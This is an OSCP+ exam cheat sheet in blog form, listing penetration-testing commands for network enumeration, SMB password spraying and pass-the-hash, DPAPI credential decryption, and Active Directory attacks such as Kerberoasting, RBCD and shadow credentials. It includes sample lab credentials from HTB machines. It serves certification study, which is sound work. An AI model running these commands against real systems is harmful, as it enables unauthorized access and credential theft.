---
title: "OSCP+ Cheat Sheet"
date: 2026-04-22 16:00:00 -0600
categories: [OSCP+]
tags: [OSCP+]

image:
    path: /assets/img/samples/another/oscp_new.svg
    alt: OSCP
---

## Network

### Port Scan 

##### Automated Enumeration

##### TCP Scan

```shell
❯ nmap -p 1-65535 <ip>
```

##### UDP Scan 

```shell
❯ nmap -sU -p 1-65535  <ip>
```

##### Manual Enumeration

Bash:
```shell
for port in $(seq 1 65535); do timeout 1 bash -c "echo > /dev/tcp/<target-ip>/$port" 2>/dev/null && echo "port $port is open"; done
```

Powershell
```shell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<target-ip>",$_)) "Port $_ is open!"} 2>$null
```


### Host Discovery

...

##### Automated Discovery

**netdiscover**:
```shell
netdiscover -i eth0
```


##### Manual Discovery


Bash:
```shell
for i in {1..254}; do ping -c 1 -W 1 10.10.0.$i &>/dev/null && echo "Found <ip>$i"; done
```

Powershell
```shell
$ping = New-Object System.Net.Networkinformation.Ping ; 1..254 | % { $ping.send("10.10.0.$_", 1) | where status -ne 'TimedOut' | select Address | fl * }
```



### DNS Lookup

### OS Fingerprint


```shell
❯ ping -c 1 <ip>
```

TTL 128 = Windows
TTL 64 = Linux

```shell
nmap -O <ip>
```


### Services

####  21/TCP - FTP

#### 22/TCP - SSH

#### 25,465,587/TCP - SMTP


##### SMTP User Enumeration

```shell
❯ smtp-user-enum -M VRFY -U <users> -t <ip>
```



#### 53/TCP|UDP - DNS

#### 80/TCP - HTTP & 443/TCP - HTTPS

#### 88/TCP - Kerberos

##### Kerberos User Enumeration


```shell
❯ kerbrute userenum --dc <dc> -d <domain> <users>
```

#### 111,135,593/TCP - RPC

#### 123/TCP - NTP

#### 139,445/TCP - SMB

##### SMB Share Enumeration

```shell
❯ netExec smb <ip> -u guest -p '' --shares # Guest auth
❯ netExec smb <ip> -u '' -p '' --shares # Null auth
```

##### SMB Users Enumeration

```shell
❯ netexec smb <ip> -u <user> -p <password> --users # Simple auth
❯ netexec smb <ip> -u guest -p '' --users # Guest auth
❯ netexec smb <ip> -u '' -p '' --users # Null auth
```

##### SMB Password Spraying

```shell
❯ NetExec smb <ip> -u <users> -p <passwords> --continue-on-success
```


##### SMB RID Cycling

```shell
❯ netexec smb <ip> -u <user> -p <password> --rid-brute # Simple auth
❯ netexec smb <ip> -u guest -p '' --rid-brute # Guest auth
❯ netexec smb <ip> -u '' -p '' --rid-brute # Null auth
```



##### Download Recursively SMB Share

```shell
❯ smbclient \\\\<ip>\\<share> <user>%<password>
```

```shell
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> cd .
smb: \> lcd <local-path>
smb: \> mget *
```

##### Generate Hosts File over SMB

```shell
❯ NetExec smb <ip> --generate-hosts-file <outfile>
```

##### Generate KRB5 File over SMB

```shell
❯ netexec smb <ip> -u <user> -p <password> -k --generate-krb5-file krb5.conf
```

##### Pass-The-Hash

```shell
❯ netexec smb <ip> -u <user> -H <nthash>
```

##### Abuse SMB Status Response


- **STATUS_PASS_MUST_CHANGE** 

- **STATUS_PASSWORD_EXPIRED**

```shell
❯ netexec smb <ip> -u <user> -p <oldpass> -M change-password -o USER=<user> NEWPASS=<newpass>
```

- **STATUS_ACCOUNT_DISABLED**

```shell
❯ bloodyAD --host <ip> -d <domain> -u <user> -p <password> remove uac <target-user> -f ACCOUNTDISABLE
```

```shell
❯ net rpc password <target-user> <newpass> -U <domain>/<user>%<password> -S <ip>
```




#### 161,162/UDP - SNMP 

```shell
❯ snmpbulkwalk -v2c -c internal <ip>
❯ snmpbulkwalk -v2c -c internal <ip> | grep "STRING"
```

```shell
snmpbrute -t <ip>
```

#### 389,636,3268,3269/TCP - LDAP

#### 3389/TCP - RDP

Simple auth
```shell
❯ xfreerdp /v:<ip> /u:<user> /p:<password>
```

Ignore Certificates
```shell
❯ xfreerdp /v:<ip> /u:<user> /p:<password> /cert-ignore
```

Pass-The-Hash
```shell
❯ xfreerdp /v:<ip> /u:<user> /pth:<nthash>
```
Dynamic resolution
```shell
❯ xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution
```

![Desktop View](/assets/img/samples/another/rdpdynamicsize.png){: w="750" h="500"}

Better experience
```shell
xfreerdp /v:<ip> /u:<user> /p:<password> /d:<domain> /cert-ignore /f +clipboard /dynamic-resolution
```


#### 5985,5986/TCP - WinRM

# Linux

## Linux Privilege Escalation

### Looking for Sensitive Information

### Cron Jobs


### Abuse SUDOERS

Sudoers File Location: `/etc/sudoers`



```shell
$ sudo -l
```

Abuse

Native UNIX Programs: 
[GTFOBins](https://gtfobins.org/)


Structures:
```
(ALL)
(ALL:ALL)
(ALL:ALL) ALL
(ALL) NOPASSWD

(root)
(root:root)
(user)
(user:group)
```




### Capabilities



```shell
$ getcap -r / 2>/dev/null
```

##### CAP_SETUID

##### 

##### 


##### 



### Abuse Groups

##### lxc/lxd

##### video 

##### adm

##### disk

##### shadow

##### docker

##### wheel

##### root

### SUID

```shell
$ find / -perm -4000 -ls 2>/dev/null
$ find / -perm -u=s -type f 2>/dev/null
```

### Kernel Exploitation

```shell 
$ uname -vr
```

### Abuse Weak File Permissions

### Source Code Analysis

### Library Hijacking




### Automated Tools


## Windows Privilege Escalation


### Local Credential Dumping

#### Autologon Password

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

#### DPAPI

Locations:

`C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials`
`C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect`

```shell
❯ impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
Impacket v0.14.0.dev0+20260313.154148.084aff60 - Copyright Fortra, LLC and its affiliated companies 

...

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```shell
❯ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.14.0.dev0+20260313.154148.084aff60 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
...
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

Practice lab: Puppy (HTB)



#### NTDS.dit 





```shell
C:\programdata> diskshadow /s C:\programdata\backup
```




# Active Directory

## AD Attacks

### As-Rep Roasting

#### Make User AS-REP Roastable

**bloodyAD**:
```shell
❯ bloodyAD --host <ip> -d <domain> -u <user> -p <password> add uac <target-user> -f DONT_REQ_PREAUTH # Enable DONT_REQUIRE_PREAUTH 
❯ bloodyAD --host <ip> -d <domain> -u <user> -p <password> remove uac <target-user> -f DONT_REQ_PREAUTH # Disable DONT_REQUIRE_PREAUTH 
```

**ldap_shell**:
```shell
❯ ldap_shell <domain>/<user>:<password> -dc-ip <dc-ip>
```

```shell
user# set_dontreqpreauth <target-user> true # Enable DONT_REQUIRE_PREAUTH 
user# set_dontreqpreauth <target-user> false # Disable DONT_REQUIRE_PREAUTH 
```

**Graphic User Interface**

From the Active Directory interface (Active Directory Users and Computers (ADUC) > Account > User Properties):

![Desktop View](/assets/img/samples/another/asreproastgui.png){: w="400" h="250"}

#### Linux

**impacket-GetNPUsers**:

- Users dictionary
```shell
❯ impacket-GetNPUsers -dc-ip <dc-ip> -usersfile <users> <domain>/
```

- Target user
```shell
❯ impacket-GetNPUsers <domain>/<target-user> -dc-ip <dc-ip> -no-pass
```

**NetExec**:

- Users dictionary
```shell
❯ netexec ldap <dc-ip> -u <users> -p '' --asreproast <outfile>
```

- Target user
```shell
❯ netexec ldap <dc-ip> -u <target-user> -p '' --asreproast <outfile>
```

minikerberos-asreproast
```shell
❯ minikerberos-asreproast <dc-ip> <domain> <users>
```




#### Windows

Rubeus.exe

Targeted user
```shell
C:\> .\Rubeus64.exe asreproast /format:<target-user>
```


### Kerberoasting

#### Linux

impacket-GetUsersSPNs
```shell
❯ impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request
```

NetExec
```shell
❯ netexec ldap <dc-ip> -u <target-user> -p <password> --kerberoasting <outfile>
```

targetedKerberoast
```shell
❯ targetedKerberoast --dc-ip <dc-ip> -v -d <domain> -u <target-user> -p <password>
```

minikerberos-kerberoast

All users
```shell
❯ minikerberos-kerberoast 'kerberos+password://<domain>\<user>:<password>@<dc-ip>' <domain> <users>
```


Targeted user
```shell
❯ minikerberos-kerberoast 'kerberos+password://<domain>\<user>:<password>@<dc-ip>' <domain> <target-user>
```


#### Windows

Rubeus.exe
```shell
C:\>.\Rubeus64.exe kerberoast
```

Invoke-Kerberoast.ps1
```shell
PS C:\> Import-Module .\Invoke-Kerberoast.ps1
PS C:\> Invoke-Kerberoast
```


### Kerberoasting without Pre-Authentication

#### Linux

impacket-GetUserSPNs
```shell
❯ impacket-GetUserSPNs -no-preauth <user> -usersfile <users-dictionary> -dc-host <dc-ip> <domain>/
```

NetExec
```shell
❯ NetExec ldap <domain> -u '' -p '' --kerberoasting <outfile>
```


### DACLs 


#### AllExtendedRights

#### DCSync

#### ForgeChangePassword

**User -> User**

![Desktop View](/assets/img/samples/another/forcechangepassworduseroveruser.png){: w="1280" h="720"}

Pass-The-Hash
```shell
❯ pth-net rpc password <target-user> -U <domain>/<user>%"ffffffffffffffffffffffffffffffff":<nthash> -S <ip>
```
Plain Password
```shell
❯ net rpc password <target-user> <newpass> -U <domain>/<user>%<password> -S <ip>
```


#### GenericAll

**User -> Group**

```shell
❯ net rpc group addmem <target-group> <user> -U <domain>/<user>%<password> -S <ip>
```


**User -> User**

![Desktop View](/assets/img/samples/another/genericalluseroveruser.png){: w="700" h="500"}

Kerberoasting
```shell
❯ targetedKerberoast -v -d <domain> -u <owned_user> -p <password>
```

Change Password
```shell
❯ net rpc password <target-user> <new-password> -U <domain>/<user>%<password> -S <ip>
```


**User -> Domain Controller**

![Desktop View](/assets/img/samples/another/genericalluseroverdomaincontroller.png){: w="1280" h="720"}

Resource-based Constrained Deleagation
```shell
❯ NetExec ldap support.htb -u support -p 'Ironside47pleasure40Watchful' -M maq
```

```shell
❯ impacket-addcomputer -computer-name 'mh4t2$' -computer-pass 'Password123!' -dc-ip 10.129.230.181 support.htb/support:'Ironside47pleasure40Watchful'
```

```
❯ impacket-rbcd -delegate-to 'DC$' -delegate-from 'mh4t2$' -dc-ip 10.129.230.181 -action write support.htb/support:'Ironside47pleasure40Watchful'

```

```
❯ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.181 support.htb/mh4t2:'Password123!'

```

```
❯ export KRB5CCNAME=./Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```


```
❯ impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```

#### GenericWrite

**User -> User**

![Desktop View](/assets/img/samples/another/genericwriteuseroveruser.png){: w="1280" h="720"}

Shadow Credential
```shell
❯ python3 /opt/HackTools/pywhisker/pywhisker/pywhisker.py -d "DC01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "WINRM_SVC" --action "add"
```

```shell
❯ certipy-ad shadow auto -u 'p.agila' -p 'prometheusx-303' -dc-ip '10.129.56.209' -account 'winrm_svc'
```

Kerberoasting
```shell
❯ python3 /opt/HackTools/targetedKerberoast/targetedKerberoast.py -v -d 'administrator.htb' -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```


#### AddSelf

**User -> Group**

```shell
❯ bloodyAD --host "10.129.55.161" -d "tombwatcher.htb" -u "Alfred" -p "basketball" add groupMember "Infrastructure" "Alfred"
```



#### WriteDacl

#### WriteOwner






## AD Privilege Escalation

### AD Credential Dumping

#### LAPS

```shell
PS C:\> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy

...

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

```shell
PS C:\> Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null }

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-Mcs-AdmPwd     : PJFCpsjQaRcdJdY!YG$!v7S1
Name              : DC01
...
```
Practice lab: Timelaps (HTB), StreamIO (HTB)
